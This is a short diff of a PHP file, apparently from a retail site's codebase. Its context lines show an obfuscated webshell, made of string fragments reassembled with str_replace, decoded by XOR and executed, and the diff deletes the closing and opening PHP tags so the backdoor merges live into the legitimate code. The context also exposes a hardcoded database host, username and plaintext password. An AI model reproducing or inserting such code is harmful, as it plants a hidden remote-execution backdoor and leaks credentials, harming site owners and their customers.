@@ -10,8 +10,6 @@ $w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
 $G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
 $o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
 $a=$t('',$o);$a();
-?>
-<?php
 ini_set( 'date.timezone', 'America/Los_Angeles' );
 $link = mysqli_connect( '10.31.79.28', 'evike', 'bEv98Diw!dlZu42', 'evikecom_core' );
 
@@ -4072,4 +4070,5 @@ function sendsms( $smsnum, $smsmsg ) {
   }
   else { return false; }
 }
+
 ?>
